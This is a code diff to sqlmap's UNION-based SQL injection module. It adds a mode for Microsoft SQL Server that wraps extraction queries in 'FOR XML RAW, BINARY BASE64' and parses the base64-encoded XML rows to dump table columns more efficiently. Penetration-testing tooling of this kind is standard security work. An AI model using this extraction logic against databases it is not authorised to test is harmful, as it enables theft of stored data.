@@ -5,8 +5,10 @@ Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
+import binascii
 import re
 import time
+import xml.etree.ElementTree
 
 from extra.safe2bin.safe2bin import safecharencode
 from lib.core.agent import agent
@@ -46,6 +48,7 @@ from lib.core.enums import PAYLOAD
 from lib.core.exception import SqlmapDataException
 from lib.core.exception import SqlmapSyntaxException
 from lib.core.settings import MAX_BUFFERED_PARTIAL_UNION_LENGTH
+from lib.core.settings import NULL
 from lib.core.settings import SQL_SCALAR_REGEX
 from lib.core.settings import TURN_OFF_RESUME_INFO_LIMIT
 from lib.core.threads import getCurrentThreadData
@@ -62,15 +65,18 @@ def _oneShotUnionUse(expression, unpack=True, limited=False):
     threadData.resumed = retVal is not None
 
     if retVal is None:
-        # Prepare expression with delimiters
-        injExpression = unescaper.escape(agent.concatQuery(expression, unpack))
-
-        # Forge the UNION SQL injection request
         vector = kb.injection.data[PAYLOAD.TECHNIQUE.UNION].vector
-        kb.unionDuplicates = vector[7]
-        kb.forcePartialUnion = vector[8]
-        query = agent.forgeUnionQuery(injExpression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5], vector[6], None, limited)
-        where = PAYLOAD.WHERE.NEGATIVE if conf.limitStart or conf.limitStop else vector[6]
+
+        if not kb.rowXmlMode:
+            injExpression = unescaper.escape(agent.concatQuery(expression, unpack))
+            kb.unionDuplicates = vector[7]
+            kb.forcePartialUnion = vector[8]
+            query = agent.forgeUnionQuery(injExpression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5], vector[6], None, limited)
+            where = PAYLOAD.WHERE.NEGATIVE if conf.limitStart or conf.limitStop else vector[6]
+        else:
+            where = vector[6]
+            query = agent.forgeUnionQuery(expression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5], vector[6], None, False)
+
         payload = agent.payload(newValue=query, where=where)
 
         # Perform the request
@@ -78,22 +84,47 @@ def _oneShotUnionUse(expression, unpack=True, limited=False):
 
         incrementCounter(PAYLOAD.TECHNIQUE.UNION)
 
-        # Parse the returned page to get the exact UNION-based
-        # SQL injection output
-        def _(regex):
-            return reduce(lambda x, y: x if x is not None else y, (\
-                    extractRegexResult(regex, removeReflectiveValues(page, payload), re.DOTALL | re.IGNORECASE), \
-                    extractRegexResult(regex, removeReflectiveValues(listToStrValue(headers.headers \
-                    if headers else None), payload, True), re.DOTALL | re.IGNORECASE)), \
-                    None)
+        if not kb.rowXmlMode:
+            # Parse the returned page to get the exact UNION-based
+            # SQL injection output
+            def _(regex):
+                return reduce(lambda x, y: x if x is not None else y, (\
+                        extractRegexResult(regex, removeReflectiveValues(page, payload), re.DOTALL | re.IGNORECASE), \
+                        extractRegexResult(regex, removeReflectiveValues(listToStrValue(headers.headers \
+                        if headers else None), payload, True), re.DOTALL | re.IGNORECASE)), \
+                        None)
 
-        # Automatically patching last char trimming cases
-        if kb.chars.stop not in (page or "") and kb.chars.stop[:-1] in (page or ""):
-            warnMsg = "automatically patching output having last char trimmed"
-            singleTimeWarnMessage(warnMsg)
-            page = page.replace(kb.chars.stop[:-1], kb.chars.stop)
+            # Automatically patching last char trimming cases
+            if kb.chars.stop not in (page or "") and kb.chars.stop[:-1] in (page or ""):
+                warnMsg = "automatically patching output having last char trimmed"
+                singleTimeWarnMessage(warnMsg)
+                page = page.replace(kb.chars.stop[:-1], kb.chars.stop)
 
-        retVal = _("(?P<result>%s.*%s)" % (kb.chars.start, kb.chars.stop))
+            retVal = _("(?P<result>%s.*%s)" % (kb.chars.start, kb.chars.stop))
+        else:
+            output = extractRegexResult(r"(?P<result>(<row[^>]+>)+)", page)
+            if output:
+                retVal = ""
+                root = xml.etree.ElementTree.fromstring("<root>%s</root>" % output)
+                for column in kb.dumpColumns:
+                    base64 = True
+                    for child in root:
+                        child.attrib[column] = child.attrib.get(column, "").encode("base64")
+                        try:
+                            child.attrib.get(column, "").decode("base64")
+                        except binascii.Error:
+                            base64 = False
+                            break
+
+                    if base64:
+                        for child in root:
+                            child.attrib[column] = child.attrib.get(column, "").decode("base64") or NULL
+
+                for child in root:
+                    row = []
+                    for column in kb.dumpColumns:
+                        row.append(child.attrib.get(column, NULL))
+                    retVal += "%s%s%s" % (kb.chars.start, kb.chars.delimiter.join(row), kb.chars.stop)
 
         if retVal is not None:
             retVal = getUnicode(retVal, kb.pageEncoding)
@@ -103,7 +134,8 @@ def _oneShotUnionUse(expression, unpack=True, limited=False):
                 retVal = htmlunescape(retVal).replace("<br>", "\n")
 
             hashDBWrite("%s%s" % (conf.hexConvert or False, expression), retVal)
-        else:
+
+        elif not kb.rowXmlMode:
             trimmed = _("%s(?P<result>.*?)<" % (kb.chars.start))
 
             if trimmed:
@@ -174,6 +206,13 @@ def unionUse(expression, unpack=True, dump=False):
     # Set kb.partRun in case the engine is called from the API
     kb.partRun = getPartRun(alias=False) if hasattr(conf, "api") else None
 
+    if Backend.isDbms(DBMS.MSSQL) and kb.dumpColumns:
+        kb.rowXmlMode = True
+        _ = "(%s FOR XML RAW, BINARY BASE64)" % expression
+        output = _oneShotUnionUse(_, False)
+        value = parseUnionPage(output)
+        kb.rowXmlMode = False
+
     if expressionFieldsList and len(expressionFieldsList) > 1 and "ORDER BY" in expression.upper():
         # Removed ORDER BY clause because UNION does not play well with it
         expression = re.sub("\s*ORDER BY\s+[\w,]+", "", expression, re.I)
@@ -186,7 +225,7 @@ def unionUse(expression, unpack=True, dump=False):
     # SQL limiting the query output one entry at a time
     # NOTE: we assume that only queries that get data from a table can
     # return multiple entries
-    if (kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.NEGATIVE or \
+    if value is None and (kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.NEGATIVE or \
        kb.forcePartialUnion or \
        (dump and (conf.limitStart or conf.limitStop)) or "LIMIT " in expression.upper()) and \
        " FROM " in expression.upper() and ((Backend.getIdentifiedDbms() \
